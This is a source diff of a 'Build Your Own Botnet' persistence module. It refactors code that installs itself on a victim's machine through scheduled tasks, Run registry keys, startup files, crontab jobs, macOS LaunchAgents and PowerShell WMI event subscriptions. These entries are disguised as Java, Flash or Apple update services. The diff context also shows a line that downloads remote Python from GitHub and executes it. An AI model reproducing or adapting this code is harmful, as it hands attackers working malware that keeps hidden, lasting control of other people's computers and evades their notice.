@@ -16,14 +16,11 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages  = ['_winreg'] if sys.platform == 'win32' else []
+packages = ['_winreg'] if sys.platform == 'win32' else []
 platforms = ['win32','linux2','darwin']
-
-# setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
-
-# templates
+results = {}
+usage = 'persistence [method] <add/remove>'
+description = 'Establish persistence on the client host machine with multiple methods to ensure redundancy'
 __Template_wmi = """$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
 $filter.QueryLanguage = "WQL"
 $filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA [STARTUP]"
@@ -43,7 +40,6 @@ $bind.Filter = $filterPath
 $bind.Consumer = $consumerPath
 $result = $bind.Put()
 $bindPath = $result.Path"""
-
 __Template_plist = """#!/bin/bash
 echo '<plist version="1.0">
 <dict>
@@ -66,8 +62,42 @@ chmod 600 ~/Library/LaunchAgents/com.apples.__LABEL__.plist
 launchctl load ~/Library/LaunchAgents/com.apples.__LABEL__.plist
 exit"""
 
-
 # main
+class Method():
+    """
+    Persistence Method (Build Your Own Botnet)
+
+    """
+    def __init__(self, name, platforms=['win32','linux2','darwin']):
+        self.name = name
+        self.result = None
+        self.established = False
+        self.platforms = platforms
+        [util.__logger__.warn("required method '_{}_{}' not found".format(_, self.name)) for _ in ('add','remove') if '_{}_{}'.format(_, self.name) not in globals()]
+
+    def add(self):
+        """ 
+        Attempt to establish persistence using the given method
+
+        """
+        if sys.platform in self.platforms:
+            if not self.established:
+                self.established, self.result = globals()['_add_{}'.format(self.name)]()
+        else:
+            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+
+    def remove(self):
+        """ 
+        Remove an established persistence method from the host machine
+
+        """
+        if sys.platform in self.platforms:
+            if self.established:
+                self.established, self.result = globals()['_remove_{}'.format(self.name)]()
+        else:
+            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+
+
 def _add_hidden_file(value=None):
     try:
         value = sys.argv[0]
@@ -211,7 +241,7 @@ def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
 
 
 def _remove_scheduled_task():
-    if methods['scheduled_task'].established and os.name == 'nt':
+    if methods['scheduled_task'].established:
         value = methods['scheduled_task'].result
         try:
              if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
@@ -254,7 +284,7 @@ def _remove_crontab_job(value=None, name='flashplayer'):
 
 def _remove_launch_agent(value=None, name='com.apple.update.manager'):
     try:
-        if methods['launch_agent'].established and os.name == 'nt':
+        if methods['launch_agent'].established:
             launch_agent = persistence['launch_agent'].result
             if os.path.isfile(launch_agent):
                 util.delete(launch_agent)
@@ -284,7 +314,7 @@ def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
 
 def _remove_registry_key(value=None, name='Java-Update-Manager'):
     try:
-        if methods['registry_key'].established and os.name == 'nt':
+        if methods['registry_key'].established:
             value = methods['registry_key'].result
             try:
                 key = OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
@@ -299,7 +329,7 @@ def _remove_registry_key(value=None, name='Java-Update-Manager'):
 
 def _remove_startup_file():
     try:
-        if methods['startup_file'].established and os.name == 'nt':
+        if methods['startup_file'].established:
             value = methods['startup_file'].result
             if value and os.path.isfile(value):
                 if os.name != 'nt':
@@ -313,69 +343,44 @@ def _remove_startup_file():
     except Exception as e:
         util.log('{} error: {}'.format(_remove_startup_file.func_name, str(e)))
 
-
-
-class PersistenceMethod():
-    """
-    Persistence PersistenceMethod (Build Your Own Botnet)
-    """
-    def __init__(self, name, platforms=['win32','linux2','darwin']):
-        if '_add_{}'.format(name) in globals() and '_remove_{}'.format(name) in globals():
-            self.name           = name
-            self.result         = None
-            self.established    = False
-            self.platforms      = platforms
-        else:
-            raise ValueError("persistence method '{}' not found".format(name))
-    
-    def add(self):
-        if sys.platform in self.platforms:
-            if not self.established:
-                self.established, self.result = globals()['_add_{}'.format(self.name)]()
-        else:
-            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
-
-    def remove(self):
-        if sys.platform in self.platforms:
-            if self.established:
-                self.established, self.result = globals()['_remove_{}'.format(self.name)]()
-        else:
-            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
-
-
-hidden_file    = PersistenceMethod('hidden_file', platforms=['win32','linux2','darwin'])
-scheduled_task = PersistenceMethod('scheduled_task', platforms=['win32'])
-registry_key   = PersistenceMethod('registry_key',   platforms=['win32'])
-startup_file   = PersistenceMethod('startup_file',   platforms=['win32'])
-launch_agent   = PersistenceMethod('launch_agent',   platforms=['darwin'])
-crontab_job    = PersistenceMethod('crontab_job',    platforms=['linux2'])
-powershell_wmi = PersistenceMethod('powershell_wmi', platforms=['win32'])
+hidden_file    = Method('hidden_file', platforms=['win32','linux2','darwin'])
+scheduled_task = Method('scheduled_task', platforms=['win32'])
+registry_key   = Method('registry_key',   platforms=['win32'])
+startup_file   = Method('startup_file',   platforms=['win32'])
+launch_agent   = Method('launch_agent',   platforms=['darwin'])
+crontab_job    = Method('crontab_job',    platforms=['linux2'])
+powershell_wmi = Method('powershell_wmi', platforms=['win32'])
 
 
 def methods():
     """
-    Returns method names and objects as key-value pairs
-    in a dictionary object
-    
+    Persistence methods as dictionary (JSON) object of key-value pairs
 
-    `PersistenceMethod`
+    Ex. {"method": <Method-object at 0x098fce>, ...}
+
+    `Method`
     :attr method add:          run the method
     :attr method remove:       remove the method
     :attr str name:            name of the method
     :attr bool established:    True/False if established
     :attr str result:          method result output
+
     """
-    return {method: globals()[method] for method in globals() if isinstance(globals()[method], PersistenceMethod)}
+    return {method: globals()[method] for method in globals() if isinstance(globals()[method], Method)}
 
 def results():
-    """
-    Return results from the successful persistence methods
+    """ 
+    Results of completed persistence methods as dictionary (JSON) object of key-value pairs
+
+    Ex. {"method": "result", ...}
+
     """
     return {name: method.result for name, method in methods().items() if method.established}
 
 def run():
     """
     Attempt to establish persistence with every method
+
     """
     for name, method in methods().items():
         if sys.platform in method.platforms:
@@ -388,6 +393,7 @@ def run():
 def abort():
     """
     Remove all established persistence methods
+
     """
     for name, method in methods().items():
         if sys.platform in method.platforms:
